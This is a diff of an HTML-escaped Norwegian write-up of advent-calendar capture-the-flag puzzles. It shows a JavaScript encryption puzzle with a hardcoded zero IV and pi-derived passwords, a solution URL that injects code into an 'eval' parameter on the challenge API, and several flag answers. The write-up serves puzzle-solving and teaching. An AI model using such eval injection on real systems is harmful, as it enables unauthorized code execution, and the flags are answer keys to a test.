 Så kaller vi decrypt med passordet, saltet og det krypterte flagget. Voila!&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://api.spst.no//eval?eval=`&amp;lt;pre&amp;gt;${decrypt('passord-61','NaHSO4',getFlag())}&amp;lt;/pre&amp;gt;`
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;Flagg: PST{24e592de8b20fe09938916d79b08854e}&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-nodejs&quot;&gt;function getFlag() {
-  // Det er sikkert smartere å kryptere flagget først, og bare skrive inn det
-  // krypterte resultatet her, enn å kryptere på serveren hver gang.
-  // 11.12.19: Kryptert flagget nå. Vi kan sikkert slette encrypt-funksjonen?
-  return &quot;e5a8aadb885cd0db6c98140745daa3acf2d06edc17b08f1aff6daaca93017db9dc8d7ce7579214a92ca103129d0efcdd&quot;;
-}
-function encrypt(input) {
-  // Bruk `decrypt` for å dekryptere
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{24e592de8b20fe09938916d79b08854e}&lt;/p&gt;
 
-  const algorithm = &quot;aes-192-cbc&quot;;
-  // 06.12.19: husk å oppdatere denne hver dag!!!
-  // 09.12.19: dette var sykt slitsomt. kan vi finne en bedre løsning?
-  // 11.12.19: Krypteres permanent med dagens passord nå.
-  // Denne funksjonen trengs vel ikke lenger?
-  const password = getPassword(&quot;10.12.19&quot;);
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// file: &quot;code.js&quot;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getFlag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// Det er sikkert smartere å kryptere flagget først, og bare skrive inn det&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// krypterte resultatet her, enn å kryptere på serveren hver gang.&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 11.12.19: Kryptert flagget nå. Vi kan sikkert slette encrypt-funksjonen?&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e5a8aadb885cd0db6c98140745daa3acf2d06edc17b08f1aff6daaca93017db9dc8d7ce7579214a92ca103129d0efcdd&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// Bruk `decrypt` for å dekryptere&lt;/span&gt;
 
-  // 09.12.19: pepper er ikke et salt. Når vi på sikt krypterer utenfor serveren
-  // burde vi oppdatere dette til noe mer vitenskapelig korrekt.
-  // Natriumhydrogensulfat?
-  // 11.12.19: Oppdatert med den kjemiske formelen ;)
-  const key = crypto.scryptSync(password, formatSalt(&quot;pepper&quot;), 24);
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;aes-192-cbc&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 06.12.19: husk å oppdatere denne hver dag!!!&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 09.12.19: dette var sykt slitsomt. kan vi finne en bedre løsning?&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 11.12.19: Krypteres permanent med dagens passord nå.&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// Denne funksjonen trengs vel ikke lenger?&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.12.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
-  const iv = Buffer.alloc(16, 0);
-  const cipher = crypto.createCipheriv(algorithm, key, iv);
-  
-  let encrypted = cipher.update(input, &quot;utf8&quot;, &quot;hex&quot;);
-  encrypted += cipher.final(&quot;hex&quot;);
+  &lt;span class=&quot;c1&quot;&gt;// 09.12.19: pepper er ikke et salt. Når vi på sikt krypterer utenfor serveren&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// burde vi oppdatere dette til noe mer vitenskapelig korrekt.&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// Natriumhydrogensulfat?&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 11.12.19: Oppdatert med den kjemiske formelen ;)&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scryptSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formatSalt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;pepper&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
-  return encrypted;
-}
-function getPassword(date) {
-  const passwords = {
-    &quot;06.12.19&quot;: &quot;passord-&quot; + getSecretPasswordNumber(3),
-    &quot;07.12.19&quot;: &quot;passord-&quot; + getSecretPasswordNumber(5),
-    &quot;08.12.19&quot;: &quot;passord-&quot; + getSecretPasswordNumber(8),
-    &quot;09.12.19&quot;: &quot;passord-&quot; + getSecretPasswordNumber(13),
-    &quot;10.12.19&quot;: &quot;passord-&quot; + getSecretPasswordNumber(21)
-  };
-  // 06.12.19: vi har ikke flere passord etter 10. Burde vurdere alternative
-  // løsninger.
-  return passwords[date] || `fant ikke passord for ${date}`;
-}
-function decrypt(password, salt, input) {
-  const algorithm = &quot;aes-192-cbc&quot;;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createCipheriv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   
-  const key = crypto.scryptSync(password, formatSalt(salt), 24);
+  &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;utf8&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;encrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;final&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;encrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06.12.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;passord-&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSecretPasswordNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;07.12.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;passord-&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSecretPasswordNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08.12.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;passord-&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSecretPasswordNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;09.12.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;passord-&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSecretPasswordNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.12.19&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;passord-&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSecretPasswordNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// 06.12.19: vi har ikke flere passord etter 10. Burde vurdere alternative&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// løsninger.&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;passwords&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`fant ikke passord for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;algorithm&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;aes-192-cbc&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
-  const iv = Buffer.alloc(16, 0);
-  const decipher = crypto.createDecipheriv(algorithm, key, iv);
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scryptSync&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formatSalt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   
-  let decrypted = decipher.update(input, 'hex','utf8');
-  decrypted += decipher.final('utf8');
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decipher&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;crypto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createDecipheriv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;algorithm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;iv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
   
-  return decrypted;
-}
-function getSecretPasswordNumber(n) {
-  return Math.PI.toFixed(48).toString().split(&quot;.&quot;)[1].slice(n, n+2);
-}
-&lt;/code&gt;&lt;/pre&gt;
+  &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;utf8&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;decrypted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;final&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;utf8&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getSecretPasswordNumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toFixed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;slice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;luke-13---token-effort-5&quot;&gt;Luke 13 - Token effort (5)&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nøkkel på avveie
@@ -1419,9 +1426,7 @@ NISSEN vil også oppfordre alle ansatte til å beskytte informasjon bedre ved br
 Sørg også for å bruke gode passord.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;blockquote&gt;
-  &lt;p&gt;PS min kode for denne oppgave er på en annen maskin, derfor har jeg ikke inkludert koden jeg faktisk brukte på denne.&lt;/p&gt;
-&lt;/blockquote&gt;
+&lt;p class=&quot;note&quot;&gt;min kode for denne oppgave er på en annen maskin, derfor har jeg ikke inkludert koden jeg faktisk brukte på denne.&lt;/p&gt;
 
 &lt;p&gt;Aller først må vi finne nøkkelen for å dekryptere &lt;a href=&quot;https://www.7-zip.org/&quot;&gt;7zip&lt;/a&gt; arkivet. 
 Her hintes det til en teknologi som er nevnt i en finn annonse for PST.
@@ -1436,9 +1441,9 @@ Analysering av tokens viser at det er 1000 unike tokens som brukes. Det er ikke 
 access-pattern mønster, IP adressene er interne, så man kan ikke se om en av de kommer fra sydpolen f.eks.
 ved å hente ut alle tokens for en dag, og lagre de i en liste, og så kjøre EXCEPT/minus for alle dager i alle kombinasjoner,
 så kan man se at det er en dag som peker seg ut med at det er et extra token den dagen. Dette viste seg å
-være Pen Gwyn (pingvinjævel) igjen.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{67e49727affdee991ec58180ee657b28}&lt;/strong&gt;&lt;/p&gt;
+være Pen Gwyn (pingvinjævel) igjen.&lt;/p&gt;
 
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{67e49727affdee991ec58180ee657b28}&lt;/p&gt;
 &lt;h2 id=&quot;luke-14---lekket-data-5&quot;&gt;Luke 14 - Lekket data (5)&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Ukens ansatt
 Jule NISSEN gratulerer joey som ukens ansatt, og takker for at han har skapt et fantastisk arbeidsmiljø 
@@ -1498,9 +1503,9 @@ Aller først må vi hente ut de faktiske bytes (strengen er base 64 encoded).
 Lagre strengen som en tekstfil &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melding.b64&lt;/code&gt;, deretter converter til bytes i bash.
 Ser ut til at vi har fått en delvis match, teksten var ikke helt korrekt. enkelt å gjette seg fram til den korrekte 
 nøkkelen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JulenErTeit&lt;/code&gt;, og vi finner flagget.
